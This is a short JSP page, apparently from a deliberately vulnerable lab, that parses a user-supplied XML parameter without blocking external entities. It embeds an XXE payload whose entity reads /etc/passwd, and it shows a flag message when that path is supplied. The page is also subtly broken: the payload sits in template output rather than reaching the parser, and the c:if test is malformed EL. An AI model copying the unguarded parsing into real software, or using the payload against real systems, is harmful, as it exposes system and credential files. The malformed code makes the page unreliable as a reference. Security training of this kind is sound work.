<%@ taglib prefix="x" uri="http://java.sun.com/jsp/jstl/xml" %>
<x:parse var="doc" xml="${param.xml}" />
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stock>
  <symbol>&xxe;</symbol>
</stock> 
<x:out select="$doc/stock/symbol" />
<c:if test="${param.file == file:///etc/passwd}">
      <p><fmt:message key="flag.m3"/></p>
</c:if>
